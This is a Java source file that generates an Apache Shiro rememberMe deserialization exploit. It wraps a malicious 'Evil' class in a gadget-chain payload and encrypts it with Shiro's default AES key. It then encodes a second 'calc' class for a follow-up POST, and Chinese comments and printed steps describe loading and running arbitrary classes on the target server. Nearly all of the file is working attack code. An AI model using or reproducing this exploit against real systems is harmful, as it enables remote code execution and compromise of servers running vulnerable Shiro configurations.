package demo;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class Client1 {
    public static void main(String []args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        
        // 1) 生成 Evil 类的 rememberMe payload
        CtClass evilClazz = pool.get(demo.Evil.class.getName());
        byte[] evilPayload = new CB().getPayload(evilClazz.toBytecode());
        String evilRememberMe = encryptWithShiroAes(evilPayload);
        
        System.out.println("=== Evil 类 RememberMe Cookie ===");
        System.out.println(evilRememberMe);
        System.out.println("\n使用: 设置 Cookie rememberMe=" + evilRememberMe);
        
        // 2) 生成 calc 类的 Base64 编码
        CtClass calcClazz = pool.get(demo.calc.class.getName());
        byte[] calcBytes = calcClazz.toBytecode();
        String calcBase64 = java.util.Base64.getEncoder().encodeToString(calcBytes);
        
        System.out.println("\n=== calc 类 Base64 编码 ===");
        System.out.println(calcBase64);
        
        // 3) 对所有字符进行URL编码（包括字母）
        String calcBase64FullUrlEncoded = fullUrlEncode(calcBase64);
        
        System.out.println("\n=== calc 类 Base64 + 全字符URL编码 ===");
        System.out.println(calcBase64FullUrlEncoded);
        
        System.out.println("\n使用步骤:");
        System.out.println("1. 先用 Evil 类的 rememberMe 注入恶意类");
        System.out.println("2. 再通过 POST 请求发送 calc 的全字符URL编码 给 Evil 类");
        System.out.println("3. Evil 类会动态加载 calc 类并执行");
        System.out.println("\n发送方式:");
        System.out.println("   - POST请求参数: classData=" + calcBase64FullUrlEncoded);
        System.out.println("\n注意: 这种编码会将所有字符都转换为%XX格式");
    }
    
    /**
     * 对所有字符进行URL编码，包括字母
     */
    private static String fullUrlEncode(String input) {
        StringBuilder result = new StringBuilder();
        for (char c : input.toCharArray()) {
            result.append("%").append(String.format("%02X", (int) c));
        }
        return result.toString();
    }
    
    private static String encryptWithShiroAes(byte[] payloads) {
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        return ciphertext.toString();
    }
}